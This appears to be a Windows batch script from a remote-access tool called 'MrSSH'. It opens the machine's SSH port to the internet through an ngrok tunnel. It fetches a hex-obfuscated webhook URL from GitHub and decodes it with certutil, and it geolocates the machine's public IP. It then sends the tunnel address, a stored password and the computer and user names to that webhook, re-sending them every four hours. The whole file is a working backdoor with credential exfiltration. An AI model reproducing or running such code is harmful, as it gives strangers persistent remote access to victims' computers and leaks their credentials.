@echo off
setlocal enabledelayedexpansion
set "LogFile=%temp%\Files\log\ngrok.log"
set "EmbedText=Connection credentials"

mkdir %temp%\Files\log
tar -xf ngrok.zip

:: <Set webhook>
curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
set "hexwebhook=%hexwebhook:~-244%"
echo !hexwebhook!>HexString.hex
certutil -decodehex HexString.hex output.hex >nul
set /p PlainString=<output.hex
del HexString.hex output.hex
set webhook=!PlainString!
:: </Set webhook>

for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" query') do set "%%a"

taskkill /IM ngrok.exe /F
start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log

:check
    find /c "url=" ngrok.log >NUL
    if %errorlevel% equ 1 goto notfound
    goto done
    :notfound
        timeout 3
        goto check
    goto done
    :done
        xcopy /h /Y ngrok.log !Folder!\log\

        for /f "delims=" %%a in (!LogFile!) do echo %%a | findstr /c:"url=" >nul && set "Result=%%a"
        for /f "tokens=8 delims==" %%a in ("!Result!") do (
            for /f "tokens=2 delims=/" %%b in ("%%a") do set RemoteURL=%%b
        )

        FOR /F "delims=" %%F IN (%temp%\TempFolder\pass.txt) DO SET Pass=%%F

        call Source.bat -silent --embed "!EmbedText! for %computername%\%username% (%query%):" ":satellite_orbital: **IP and port:** !RemoteURL!\\n\\n:detective: **Password:** !Pass!" "FFFDBC" "https://i.imgur.com/b2Terft.png"
        :Loop
            timeout 14400
            taskkill /IM ngrok.exe /F
            start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
            set "EmbedText=Renewing session"
            goto check
            goto Loop